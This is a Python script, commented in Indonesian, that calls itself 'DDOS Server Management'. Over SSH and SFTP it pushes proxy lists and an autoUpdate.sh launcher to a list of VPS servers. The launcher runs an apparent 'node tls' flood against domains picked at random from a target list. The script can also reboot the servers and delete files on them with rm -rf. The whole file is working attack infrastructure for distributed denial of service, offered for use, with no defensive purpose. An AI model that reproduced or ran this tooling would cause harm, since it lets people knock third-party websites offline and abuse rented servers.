import argparse
import os
import random
import paramiko
import subprocess

list_domains = []
check_domains = []
sftp_username = "Username"
sftp_password = "Password"
remote_path = "/root/"

def upload_file_to_sftp(nama_file = None, sftp_host = None, sftp_user = sftp_username, sftp_password = sftp_password):
    try :
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(sftp_host, username= sftp_user, password=sftp_password)

        print("Berhasil login ke", sftp_host)
        

        remote_path_server = f"{remote_path}{nama_file}"

        import os

        if not os.path.exists(nama_file):
            print("Error: File autoUpdate.sh tidak ditemukan di lokal sebelum diunggah.")
        else:
            sftp = ssh.open_sftp()
            sftp.put(nama_file, remote_path_server)
            sftp.close()
            ssh.close()
            print(f"File {nama_file} berhasil diunggah ke {remote_path_server}")

    except Exception as e:
        print("Gagal login ke", sftp_host, "karena", e)

def reboot_server(sftp_host = None):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(sftp_host, username= sftp_username, password=sftp_password)
        stdin, stdout, stderr = ssh.exec_command("reboot")

        print(F"Server {sftp_host} berhasil di reboot")
    except Exception as e:
        print("Terjadi Kesalahan Karena", e)

def delete_file(nama_file = None, sftp_host = None):
    try:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        ssh.connect(sftp_host, username= sftp_username, password=sftp_password)
        stdin, stdout, stderr = ssh.exec_command(f"rm -rf {remote_path}{nama_file}")

        print(F"File {nama_file} berhasil dihapus dari {sftp_host}")
    except Exception as e:
        print("Terjadi Kesalahan Karena", e)

def scraping():
    current_directory = os.path.dirname(os.path.abspath(__file__))
    # tools_directory = os.path.join(current_directory, 'tools')
    scrape_file = os.path.join(current_directory, 'scrape.py')
    subprocess.run(['python', scrape_file])

def parse_args():
    parser = argparse.ArgumentParser(description="DDOS Server Management")
    parser.add_argument('--proxy-scrape', action='store_true', help="Scraping Proxy dan upload ke dalam server")
    parser.add_argument('--proxy-per-server', action='store_true', help="Upload Proxy per server")
    parser.add_argument('--reboot', action='store_true', help="Reboot Server")
    parser.add_argument('--remove-file', help="Hapus File")
    parser.add_argument('--sftp-host', help="Host SFTP untuk menghapus file")
    parser.add_argument('--remove-all-file', help="Hapus Semua File Tertentu di server")

    return parser.parse_args()

def main(): 
    global check_domains

    args = parse_args()

    if args.proxy_scrape:
        scraping()
    if args.remove_file and args.sftp_host:
        delete_file(args.remove_file, args.sftp_host)
    else:
        with open("domains.txt", "r") as f:
            for line in f.readlines():
                list_domains.append(line.strip())

        with open("vps-server.txt", "r") as f:
            for line in f.readlines():
                sftp_host = line.strip()

                if args.reboot:
                    reboot_server(sftp_host)
                elif args.remove_all_file:
                    delete_file(args.remove_all_file, sftp_host)
                else: 
                    domain = random.choice(list_domains)

                    while domain in check_domains:
                        domain = random.choice(list_domains)

                    check_domains.append(domain)

                    if len(list_domains) == len(check_domains):
                        check_domains = []
                    
                    if args.proxy_per_server:
                        scraping()

                    if args.proxy_scrape or args.proxy_per_server:
                        upload_file_to_sftp("proxy.txt", sftp_host)
                        print("proxy.txt diupload ke", sftp_host)
                    else:
                        autoUpdateSh = f"node tls {domain} 60 64 10 proxy.txt"

                        with open("autoUpdate.sh", "w") as f:
                            f.write(autoUpdateSh)
                        
                        print("autoUpdate.sh diupload ke", sftp_host)
                        
                        upload_file_to_sftp("autoUpdate.sh", sftp_host)

                    with open("logs.txt", "a") as f:
                        f.write(f"Domain: {domain} | Host: {sftp_host} \n")

if __name__ == '__main__' :
    main()